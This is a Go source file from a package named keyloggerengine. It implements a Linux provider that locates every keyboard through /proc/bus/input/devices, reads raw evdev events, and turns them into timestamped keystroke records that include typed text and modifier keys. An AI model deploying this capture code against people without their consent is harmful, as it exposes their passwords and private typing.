//go:build linux

package keyloggerengine

import (
	"bufio"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	linuxEventKey = 0x01
)

type linuxInputEvent = evdevInputEvent

type linuxProvider struct {
	findDevices func() ([]string, error)
	openDevice  func(string) (io.ReadCloser, error)
}

func newLinuxProvider() *linuxProvider {
	finder := linuxDeviceFinder
	if finder == nil {
		finder = detectKeyboardDevices
	}
	opener := linuxDeviceOpener
	if opener == nil {
		opener = func(path string) (io.ReadCloser, error) {
			return os.Open(path)
		}
	}
	return &linuxProvider{
		findDevices: finder,
		openDevice:  opener,
	}
}

func defaultProviderFactory() func() Provider {
	return func() Provider {
		return newLinuxProvider()
	}
}

func (p *linuxProvider) Start(ctx context.Context, cfg StartConfig) (EventStream, error) {
	if ctx == nil {
		ctx = context.Background()
	}

	devices, err := p.findDevices()
	if err != nil || len(devices) == 0 {
		return nil, ErrProviderUnavailable
	}

	normalized := cfg.normalize()
	stream := newChannelEventStream(normalized.BufferSize)
	modifiers := &modifierState{}

	var wg sync.WaitGroup
	started := 0

	for _, device := range devices {
		rc, openErr := p.openDevice(device)
		if openErr != nil {
			continue
		}
		started++
		wg.Add(1)
		go func(r io.ReadCloser) {
			defer wg.Done()
			defer r.Close()
			p.readEvents(ctx, r, stream, modifiers)
		}(rc)
	}

	if started == 0 {
		stream.Close()
		return nil, ErrProviderUnavailable
	}

	go func() {
		<-ctx.Done()
		stream.Close()
	}()

	go func() {
		wg.Wait()
		stream.Close()
	}()

	return stream, nil
}

func (p *linuxProvider) readEvents(ctx context.Context, r io.Reader, stream *channelEventStream, modifiers *modifierState) {
	decoder := binary.LittleEndian
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		var ev linuxInputEvent
		if err := binary.Read(r, decoder, &ev); err != nil {
			return
		}
		if ev.Type != linuxEventKey {
			continue
		}

		pressed := ev.Value != 0

		if isModifierKey(ev.Code) {
			modifiers.set(ev.Code, pressed)
		}
		alt, ctrl, shift, meta := modifiers.snapshot()

		key := keyForScanCode(ev.Code)
		timestamp := time.Unix(ev.Sec, ev.Usec*1000).UTC()

		event := CaptureEvent{
			Timestamp: timestamp,
			Key:       key,
			RawCode:   fmt.Sprintf("%d", ev.Code),
			ScanCode:  ev.Code,
			Pressed:   pressed,
			Alt:       alt,
			Ctrl:      ctrl,
			Shift:     shift,
			Meta:      meta,
		}

		if pressed && len(key) == 1 {
			if shift {
				event.Text = strings.ToUpper(key)
			} else {
				event.Text = key
			}
		}

		if !stream.emit(ctx, event) {
			return
		}
	}
}

var linuxDeviceFinder = detectKeyboardDevices

func detectKeyboardDevices() ([]string, error) {
	file, err := os.Open("/proc/bus/input/devices")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var devices []string
	for scanner.Scan() {
		line := scanner.Text()
		if !strings.HasPrefix(line, "H: Handlers=") {
			continue
		}
		handlers := strings.Fields(strings.TrimPrefix(line, "H: Handlers="))
		hasKeyboard := false
		var eventNames []string
		for _, handler := range handlers {
			if handler == "kbd" || strings.Contains(strings.ToLower(handler), "keyboard") {
				hasKeyboard = true
			}
			if strings.HasPrefix(handler, "event") {
				eventNames = append(eventNames, handler)
			}
		}
		if hasKeyboard {
			for _, name := range eventNames {
				devices = append(devices, filepath.Join("/dev/input", name))
			}
		}
	}
	if len(devices) == 0 {
		return nil, fmt.Errorf("no keyboard devices found")
	}
	return devices, nil
}

var linuxDeviceOpener = func(path string) (io.ReadCloser, error) {
	return os.Open(path)
}
